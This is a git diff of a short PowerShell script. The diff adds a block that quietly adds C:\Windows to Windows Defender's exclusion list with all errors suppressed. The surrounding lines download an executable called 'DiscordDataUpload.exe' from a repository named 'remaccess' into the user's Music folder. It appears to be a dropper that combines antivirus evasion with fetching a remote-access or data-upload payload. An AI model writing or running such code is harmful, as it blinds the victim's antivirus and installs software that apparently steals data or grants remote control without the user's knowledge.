@@ -1,4 +1,13 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+#Exclusion additon.
+try {
+    $exclusionPath = "C:\Windows"
+    Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue -ErrorVariable AddExclusionError | Out-Null
+    if (-not $AddExclusionError) {
+    }
+  }
+  catch {}
+  
 $url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
 $exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
 Invoke-WebRequest -Uri $url -OutFile $exepath
